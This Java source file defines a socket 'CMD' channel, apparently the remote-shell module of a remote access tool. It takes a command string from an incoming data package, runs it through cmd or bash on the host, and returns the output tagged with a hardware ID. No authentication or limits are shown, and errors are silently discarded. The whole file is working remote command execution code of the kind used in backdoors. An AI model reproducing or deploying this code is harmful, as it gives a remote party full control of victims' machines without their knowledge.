package de.dion.socket.localobjects.channel.channels;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import de.dion.socket.PackageSender;
import de.dion.socket.localobjects.channel.Channel;
import de.dion.socket.objects.DataPackage;
import de.dion.socket.utils.Crypter;

public class CMD extends Channel {

	public CMD() {
		super("CMD");
	}

	@Override
	public void onSocketReceive(DataPackage pack) {
		String output = executeConsoleCommand(pack.get(0).toString());
		sendDataPackage(new DataPackage("CMD", HWID, output));
	}
	
	private String executeConsoleCommand(String command) {
	    String output = "failed";
	    Runtime r = Runtime.getRuntime();
	    String os = System.getProperty("os.name");
	    String[] commands = {"cmd", "/c", command};
	    
	    if(os.toLowerCase().contains("linux"))
	    {
	    	commands[0] = "bash";
	    	commands[1] = "-c";
	    }
	    
	    try {
	        Process p = r.exec(commands);

	        p.waitFor();
	        BufferedReader b = new BufferedReader(new InputStreamReader(p.getInputStream()));
	        String line = "";
	        
	        while ((line = b.readLine()) != null) {
	        	
	        	if(output.equals("failed"))
	        	{
	        		output = line;
	        	}
	        	else
	        	{
	        		output += "\n" + line;
	        	}
	        }

	        b.close();
	        
	        if(output.equals("failed"))
	        {
	        	output = "success";
	        }
	    } catch (Exception e) {}
	    return output;
	}

}
